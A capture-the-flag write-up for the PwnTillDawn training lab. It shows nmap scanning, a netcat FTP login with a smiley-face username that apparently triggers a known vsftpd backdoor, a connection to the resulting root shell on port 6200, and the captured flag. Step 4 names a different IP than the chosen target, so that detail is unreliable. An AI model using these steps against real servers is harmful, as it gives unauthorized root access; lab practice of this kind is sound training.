# PwnTillDawn
## Objective

- to compromise systems and retrieve the flag by exploiting vulnerabilities

  ## Step 1
  connect Kali tu PwnTillDawn vpn.
  ```
  sudo openvpn PwnTillDawn.ovpn
  ```

  Once connected, an IP will appear in the top right corner showing 10.66.67.170.

  ## Step 2
  Scan ip given from PwnTillDawn in range 10.150.150.10 until 10.150.150.254.
  ```
  sudo nmap -sn 10.150.150.0/24
  ```
  it will help to discover active machine.

  ## Step 3
  from the ip listed i choose 10.150.150.12. Scan the IP with:
  ```
  nmap -sC -sV -Pn -vv 10.150.150.12
  ```
  - port 21 -> ftp
  - port 22 -> ssh
 
  ## Step 4
  login to ftp server using netcat
  ```
  (echo "USER hello:)"; echo "PASS password"; sleep 1) | nc -nv 10.150.150.11 21
  ```
  this command use netcat to connect to ftp server on port 21 and automatically sends login credentials.

  ## Step 5
  To see if exploit worked, I try to connect to the backdoor port and run this commands:
  ```
  nc -nv 10.150.150.12 6200
  ```
  after that I type whoami and id to check whether I'd accessed root.
  To capture the flag I run this command and result as shown below:
  ```
  ls /root
  FLAG1.TXT
  snap
  cat /root/FLAG1.TXT
  5ee499eb5d0b8e4269b13483e57adaa0b3815f48
  ```

  Finally get the code which is '5ee499eb5d0b8e4269b13483e57adaa0b3815f48' and submit the flag value   to the PwnTillDawn and successfully received certificate.
